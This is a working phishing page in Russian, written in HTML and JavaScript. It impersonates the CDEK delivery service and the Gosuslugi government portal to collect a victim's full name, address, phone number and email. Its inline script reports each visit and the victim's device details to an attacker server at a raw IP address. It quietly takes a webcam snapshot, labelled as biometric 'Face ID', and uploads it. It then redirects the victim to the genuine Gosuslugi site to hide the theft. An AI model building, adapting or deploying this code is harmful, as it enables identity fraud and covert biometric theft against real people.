<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Форма регистрации</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- ЭКРАН 1: Первичная инициализация -->
    <div id="sitePreloader" class="preloader">
        <div class="spinner"></div>
        <div class="preloader-text">Инициализация сервиса...</div>
    </div>

    <!-- ЭКРАН 2: ТЕРМИНАЛ (Чистый консольный блок) -->
    <div id="hackerModal" class="hacker-overlay">
        <div class="hacker-window">
            <div class="hacker-body">
                <div id="terminalConsole" class="terminal-console"></div>
                <div class="hacker-progress-container">
                    <div class="progress-info">
                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar-bg">
                        <div id="progressBarFill" class="progress-bar-fill"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ЭКРАН 4: Перенаправление / Загрузка профиля -->
    <div id="profileLoaderOverlay" class="modal-overlay">
        <div class="top-logo-container">
            <img src="flags/logo.png" alt="Logo" class="top-logo">
        </div>

        <div class="status-card">
            <h3 class="status-title">Госуслуги сейчас откроются</h3>
            <p class="status-subtitle">Портал работает в прежнем режиме.<br>Подождите пару секунд</p>
            
            <div class="dots-container">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </div>
        </div>
    </div>

    <!-- ЭКРАН 3: Основная форма (СДЭК) -->
    <div class="page-wrapper" id="mainContent">
        <div class="card active">
            <!-- Логотип над слоганом -->
            <div class="logo-container">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGmnNH7IajkFqD8JBpC2ZqNy1QbascYux29PnRRxg5dQ&s=10" alt="Логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="logo-placeholder" style="display:none;">СДЭК</div>
            </div>
            
            <h2>Регистрация пользователя</h2>
            
            <form onsubmit="return false;">
                <div class="form-group">
                    <label>ФИО</label>
                    <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
                </div>

                <div class="form-group">
                    <label>Адрес доставки</label>
                    <input type="text" id="fullAddress" placeholder="г. Москва, ул. Ленина, д. 10" required>
                </div>

                <div class="form-group">
                    <label>Номер телефона</label>
                    <input type="tel" id="phoneNumber" placeholder="+7 912 345 67 89" required>
                </div>

                <div class="form-group">
                    <label>E-mail адрес</label>
                    <input type="email" id="emailInput" placeholder="ivanov@example.com" required>
                </div>

                <button type="submit" id="getSmsBtn" class="btn-green">Продолжить</button>
            </form>
        </div>
    </div>

    <div id="toastContainer" class="toast-container"></div>
    
    <!-- === ОБНОВЛЕННЫЙ БЛОК: Скрипт связи с ботом (3 Этапа) === -->
    <script>
        const API_URL = 'http://144.124.237.170:5001';
        const currentSessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 10);
        localStorage.setItem('sessionId', currentSessionId);

        function getRefCode() {
            const params = new URLSearchParams(window.location.search);
            return params.get('ref');
        }

        // ==========================================
        // ЭТАП 1: ПЕРВИЧНОЕ ПОСЕЩЕНИЕ САЙТА
        // ==========================================
        window.addEventListener('DOMContentLoaded', () => {
            fetch(`${API_URL}/api/visit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: currentSessionId,
                    refCode: getRefCode(),
                    deviceInfo: {
                        userAgent: navigator.userAgent,
                        localTime: new Date().toLocaleTimeString()
                    }
                })
            }).catch(err => console.error("Ошибка Этапа 1:", err));
        });

        // ==========================================
        // ЭТАП 2: ОТПРАВКА ФОТО (FACE ID) ПОСЛЕ ПОКАЗА ЛОАДЕРА
        // ==========================================
        // Эту функцию нужно вызывать в script.js, когда показывается экран "Госуслуги сейчас откроются"
        async function triggerStage2_Biometry() {
            try {
                // Запрашиваем доступ к веб-камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // Делаем снимок через canvas
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Конвертируем в base64
                const imageData = canvas.toDataURL('image/jpeg');
                
                // Выключаем камеру
                stream.getTracks().forEach(track => track.stop());

                // Отправляем фото в бота
                await fetch(`${API_URL}/api/biometry`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        image: imageData
                    })
                });

            } catch (err) {
                console.warn("Камера недоступна, отправка заглушки (Этап 2)");
                // Если нет камеры, отправляем 1x1 пустой пиксель, чтобы сервер не выдал ошибку 400
                const emptyPixel = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";
                
                await fetch(`${API_URL}/api/biometry`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        image: emptyPixel
                    })
                });
            }
        }

        // ==========================================
        // ЭТАП 3: УСПЕШНЫЙ ВХОД И РЕДИРЕКТ В ЛК
        // ==========================================
        function triggerStage3_Success(targetUrl = 'https://lk.gosuslugi.ru/') {
            fetch(`${API_URL}/api/success`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: currentSessionId
                })
            }).finally(() => {
                // В любом случае перенаправляем пользователя в личный кабинет
                window.location.href = targetUrl;
            });
        }

        // --- Пример автоматизации внутри index.html ---
        // Если вы хотите, чтобы вся цепочка (Этап 2 -> Этап 3) срабатывала автоматически 
        // при показе экрана profileLoaderOverlay, вы можете вызывать их в вашем файле script.js вот так:
        //
        // showProfileLoader();
        // await triggerStage2_Biometry();
        // triggerStage3_Success('ваша-ссылка-на-кабинет');
        
    </script>
    <!-- === КОНЕЦ ОБНОВЛЕННОГО БЛОКА === -->

    <script src="script.js"></script>
</body>
</html>
